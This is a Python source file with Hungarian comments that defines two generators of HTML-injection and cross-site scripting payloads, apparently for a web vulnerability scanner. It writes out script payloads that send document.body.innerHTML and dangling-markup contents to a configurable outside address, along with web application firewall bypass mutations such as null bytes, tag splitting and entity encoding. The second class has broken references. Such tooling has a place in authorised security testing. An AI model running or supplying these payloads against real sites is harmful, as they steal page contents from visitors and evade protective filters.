import random
import re
import string
from pluck.module import GenerationModule

class HTMLInjectionPayloadGenerator:
    def __init__(self, target_address="127.0.0.1"):
        self.base_payloads = set()
        self.mutated_payloads = set()
        self.reflection_string = ""      # Random generált string a DOM reflektáláshoz
        self.unique_id = ""              # Egyedi ID attribútum azonosításhoz
        self.possible_results = set()    # Várható eredmények a response-ból (sikeres injekciók és reflektált stringek)
        self.target_address = target_address  # Cél cím az adatküldéshez

        

    def generate_random_string(self, length=12):
        """Generate a random string for reflection testing and unique ID."""
        self.reflection_string = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        self.unique_id = f"id-{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}"  # Egyedi ID

    def generate_payloads(self):
        """Generate HTML Injection payloads with unique IDs, WAF bypass techniques, and unclosed tag manipulation."""
        self.generate_random_string()      # Véletlenszerű string és ID generálása
        self.collect_possible_results()    # Lehetséges eredmények összegyűjtése

        # Alap HTML Injection payloadok (ID-val és anélkül)
        self.base_payloads = {
            f"<b>{self.reflection_string}</b>",
            f"<b id='{self.unique_id}'>{self.reflection_string}</b>",
            f"<img src=x onerror=alert('{self.reflection_string}')>",
            f"<img id='{self.unique_id}' src=x onerror=alert('{self.reflection_string}')>",
            f"<div>{self.reflection_string * 3}</div>",
            f"<div id='{self.unique_id}'>{self.reflection_string * 3}</div>",
            f'"><b>{self.reflection_string}</b>',
            f"'><b>{self.reflection_string}</b>",
            f'"><b id="{self.unique_id}">{self.reflection_string}</b>',
            f"'><b id='{self.unique_id}'>{self.reflection_string}</b>",
            f"<svg/onload=alert('{self.reflection_string}')>",
            f"<svg id='{self.unique_id}' onload=alert('{self.reflection_string}')>",
            f"<s>{self.reflection_string}</s>",
            f"<s id='{self.unique_id}'>{self.reflection_string}</s>",
        }

        # Dangling Markup Injection Payloadok Távoli Adatküldéssel és Nem Lezárt Tag Manipulációval
        self.base_payloads.update({
            # Automatikus adatküldés különböző tagekkel
            f"<img src='http://{self.target_address}/?d={self.reflection_string}'>",
            f"<a href='http://{self.target_address}/?d={self.reflection_string}'>Click me!</a>",
            f"<iframe src='http://{self.target_address}/?d={self.reflection_string}'></iframe>",
            f"<link rel='stylesheet' href='http://{self.target_address}/?d={self.reflection_string}'>",

            # Form alapú küldés automatikus submit-tal
            f"<form action='http://{self.target_address}/' method='GET'><input name='d' value='{self.reflection_string}'><input type='submit'></form>",

            # Nem lezárt tagek, amelyek a DOM-ot manipulálják és küldik el
            f"<div><img src='http://{self.target_address}/?r={self.reflection_string}&d=",  # Nem lezárt img tag
            f"<div><a href='http://{self.target_address}/?r={self.reflection_string}&d=",  # Nem lezárt link
            f"<div><iframe src='http://{self.target_address}/?r={self.reflection_string}&d=",  # Nem lezárt iframe

            # JavaScript alapú DOM elküldés
            f"<script>fetch('http://{self.target_address}/?d='+document.body.innerHTML)</script>",
            f"<body onload='fetch(\"http://{self.target_address}/?d=\"+document.body.innerHTML)'>",

            # Textarea korai lezárása és adatküldés
            f"</textarea><img src='http://{self.target_address}/?d={self.reflection_string}'>",

            # Attribútum manipuláció eseménykezelőkkel
            f"' onmouseover='fetch(\"http://{self.target_address}/?d={self.reflection_string}\")'",
        })

        # Payloadok összegyűjtése és WAF bypass mutációk alkalmazása
        for payload in self.base_payloads:
            self.mutated_payloads.add(payload)
            self.apply_waf_bypass(payload)

        return list(self.mutated_payloads)

    def collect_possible_results(self):
        """Collect all possible outputs for detection, including reflected strings and injected IDs."""
        self.possible_results.add(self.reflection_string)
        repeated_string = self.reflection_string * 3
        self.possible_results.add(repeated_string)
        self.possible_results.add(f"id='{self.unique_id}'")
        self.possible_results.add(self.unique_id)

        # Dangling markup és adatküldés URL-ek
        self.possible_results.add(f"http://{self.target_address}/?d={self.reflection_string}")
        self.possible_results.add(f"<img src='http://{self.target_address}/?d={self.reflection_string}'>")
        self.possible_results.add(f"<iframe src='http://{self.target_address}/?d={self.reflection_string}'>")
        self.possible_results.add(f"<script>fetch('http://{self.target_address}/?d='+document.body.innerHTML)</script>")

    def apply_waf_bypass(self, payload):
        """Apply WAF bypass techniques to HTML Injection payloads."""
        self.mutated_payloads.add(payload.replace('<', '<scr<script>ipt>'))  # Tag breaking
        unicode_encoded = ''.join(f'&#x{ord(c):x};' if c.isalnum() else c for c in payload)
        self.mutated_payloads.add(unicode_encoded)
        null_byte_injection = payload.replace('>', '\x00>')
        self.mutated_payloads.add(null_byte_injection)
        self.mutated_payloads.add(payload.replace('>', '><!--bypass-->'))

    def save_to_file(self, filename='html_injection_payloads.txt'):
        payloads = self.generate_payloads()
        with open(filename, 'w') as f:
            for p in payloads:
                f.write(p + '\n')
        print(f"Generated {len(payloads)} unique HTML Injection payloads and saved to {filename}.")
        print(f"Random Reflection String: {self.reflection_string}")
        print(f"Unique ID for DOM detection: {self.unique_id}")
        print(f"Target Address for Data Exfiltration: {self.target_address}")
        print(f"Possible Results for Detection: {list(self.possible_results)}")

class HTMLInjectionPayloadGenerator2(GenerationModule):
    def __init__(self, domain="127.0.0.1"):
        super().__init__()
        self.base_payloads = set()
        self.mutated_payloads = set()
        self.unique_string = ""      # Random generált string a DOM reflektáláshoz
      
        self.possible_results = set()    # Várható eredmények a response-ból (sikeres injekciók és reflektált stringek)
        self.domain = domain  # Cél cím az adatküldéshez

        

    def generate_random_string(self, length=12):
        """Generate a random string for reflection testing and unique ID."""
        self.reflection_string = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        self.unique_id = f"id-{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}"  # Egyedi ID

    def generate_payloads(self):
        """Generate HTML Injection payloads with unique IDs, WAF bypass techniques, and unclosed tag manipulation."""
        #self.generate_random_string()      # Véletlenszerű string és ID generálása
        self.collect_possible_results()    # Lehetséges eredmények összegyűjtése

        # Alap HTML Injection payloadok (ID-val és anélkül)
        self.base_payloads = {
            f"<b>{self.unique_string}</b>",
            f"<b id='{self.unique_string}'>{self.unique_string}</b>",
            f"<img src=x onerror=alert('{self.unique_string}')>",
            f"<img id='{self.unique_string}' src=x onerror=alert('{self.unique_string}')>",
            f"<div>{self.unique_string * 3}</div>",
            f"<div id='{self.unique_string}'>{self.unique_string * 3}</div>",
            f'"><b>{self.unique_string}</b>',
            f"'><b>{self.unique_string}</b>",
            f'"><b id="{self.unique_string}">{self.unique_string}</b>',
            f"'><b id='{self.unique_string}'>{self.unique_string}</b>",
            f"<svg/onload=alert('{self.unique_string}')>",
            f"<svg id='{self.unique_string}' onload=alert('{self.unique_string}')>",
            f"<s>{self.unique_string}</s>",
            f"<s id='{self.unique_string}'>{self.unique_string}</s>",
        }

        # Dangling Markup Injection Payloadok Távoli Adatküldéssel és Nem Lezárt Tag Manipulációval
        self.base_payloads.update({
            # Automatikus adatküldés különböző tagekkel
            f"<img src='http://{self.domain}/?d={self.unique_string}'>",
            f"<a href='http://{self.domain}/?d={self.unique_string}'>Click me!</a>",
            f"<iframe src='http://{self.domain}/?d={self.unique_string}'></iframe>",
            f"<link rel='stylesheet' href='http://{self.domain}/?d={self.unique_string}'>",

            # Form alapú küldés automatikus submit-tal
            f"<form action='http://{self.domain}/' method='GET'><input name='d' value='{self.unique_string}'><input type='submit'></form>",

            # Nem lezárt tagek, amelyek a DOM-ot manipulálják és küldik el
            f"<div><img src='http://{self.domain}/?r={self.unique_string}&d=",  # Nem lezárt img tag
            f"<div><a href='http://{self.domain}/?r={self.unique_string}&d=",  # Nem lezárt link
            f"<div><iframe src='http://{self.domain}/?r={self.unique_string}&d=",  # Nem lezárt iframe

            # JavaScript alapú DOM elküldés
            f"<script>fetch('http://{self.domain}/?d='+document.body.innerHTML)</script>",
            f"<body onload='fetch(\"http://{self.domain}/?d=\"+document.body.innerHTML)'>",

            # Textarea korai lezárása és adatküldés
            f"</textarea><img src='http://{self.domain}/?d={self.unique_string}'>",

            # Attribútum manipuláció eseménykezelőkkel
            f"' onmouseover='fetch(\"http://{self.domain}/?d={self.unique_string}\")'",
        })

        # Payloadok összegyűjtése és WAF bypass mutációk alkalmazása
        for payload in self.base_payloads:
            self.mutated_payloads.add(payload)
            self.apply_waf_bypass(payload)

        return list(set(self.mutated_payloads))

    def collect_possible_results(self):
        """Collect all possible outputs for detection, including reflected strings and injected IDs."""
        self.evidence_strings.append(self.unique_string)
        repeated_string = self.unique_string * 3
        self.evidence_strings.append(repeated_string)
        self.evidence_strings.append(f"id='{self.unique_string}'")
        self.evidence_strings.append(self.unique_string)

        # Dangling markup és adatküldés URL-ek
        self.evidence_strings.append(f"http://{self.domain}/?d={self.unique_string}")
        self.evidence_strings.append(f"<img src='http://{self.domain}/?d={self.unique_string}'>")
        self.evidence_strings.append(f"<iframe src='http://{self.domain}/?d={self.unique_string}'>")
        self.evidence_strings.append(f"<script>fetch('http://{self.domain}/?d='+document.body.innerHTML)</script>")

    def apply_waf_bypass(self, payload):
        """Apply WAF bypass techniques to HTML Injection payloads."""
        self.mutated_payloads.add(payload.replace('<', '<scr<script>ipt>'))  # Tag breaking
        unicode_encoded = ''.join(f'&#x{ord(c):x};' if c.isalnum() else c for c in payload)
        self.mutated_payloads.add(unicode_encoded)
        null_byte_injection = payload.replace('>', '\x00>')
        self.mutated_payloads.add(null_byte_injection)
        self.mutated_payloads.add(payload.replace('>', '><!--bypass-->'))

    


# Példa használat
#if __name__ == "__main__":
#    generator = HTMLInjectionPayloadGenerator(target_address="my_address.com")
#    #generator.save_to_file('html_injection_payloads_with_unclosed_tags.txt')
#    payloads = generator.generate_payloads()
#    for p in payloads:
#      print(p)
